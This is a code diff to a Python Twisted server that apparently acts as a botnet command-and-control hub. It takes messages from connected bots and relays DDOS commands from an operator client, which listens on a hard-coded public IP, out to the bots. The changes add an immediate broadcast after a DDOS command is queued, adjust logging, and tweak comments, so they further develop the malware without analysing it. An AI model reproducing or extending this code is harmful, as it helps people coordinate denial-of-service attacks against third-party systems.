@@ -39,10 +39,10 @@ class echoPeer(protocol.Protocol):
 
     #Data received from bot
     def dataReceived(self, data):
-        logging.debug("Data received from [%s] -> [%s]" %(self.peer_id, data))
         global client_msg
         data = data.decode('utf-8', 'ignore')
         #New message for client
+        #TODO define message type
         client_msg.append(data)
 
 class peerFactory(protocol.Factory):
@@ -52,6 +52,7 @@ class peerFactory(protocol.Factory):
         #Broadcast data to peers
         def broadcast_msg():
             global peer_msg
+            global client_msg
             if peer_msg:
                 app_peer_msg = peer_msg
                 for message in app_peer_msg:
@@ -66,7 +67,6 @@ class peerFactory(protocol.Factory):
                                 logging.debug('Message [%s] to peer %s' %(peer_cmd, pid))
                                 self.peers[peer_id].transport.write(peer_cmd.encode('utf-8'))
                                 peer_msg.remove(message)
-                    
                     elif op == 'DDOS':
                         ddos_msg = msg[2]
                         max_peers = int(msg[1])
@@ -113,6 +113,7 @@ class echoClient(protocol.Protocol):
                 max_peers = p_data[1]
                 msg = '::'.join(['DDOS',max_peers, ddos_msg])
                 peer_msg.append(msg)
+                self.broadcast()
             #If peer_ip is null, client is asking for the peers connected
             else:
                 send_ip = '*'.join(ip_list)
@@ -127,7 +128,7 @@ class echoClient(protocol.Protocol):
             if client_msg:
                 app_client_msg = client_msg
                 for msg in app_client_msg:
-                    logging.debug('Message to client --> %s' %msg)
+                    logging.debug('Message to client --> %s' %msg[40:])
                     self.transport.write(msg.encode('utf-8')) 
                     client_msg.remove(msg)
                 looping_call.stop()
@@ -140,7 +141,7 @@ class clientFactory(protocol.Factory):
         return echoClient()
  
 if __name__ == '__main__':
-    #TODO implement a sort of authentication to the server to avoi request from other clients
+    #TODO implement a sort of authentication to the server to avoid requests from other clients
     endpoints.serverFromString(reactor, "tcp:8080:interface=127.0.0.1").listen(peerFactory())
     endpoints.serverFromString(reactor, "tcp:8443:interface=167.99.194.11").listen(clientFactory())
     print("Server running");
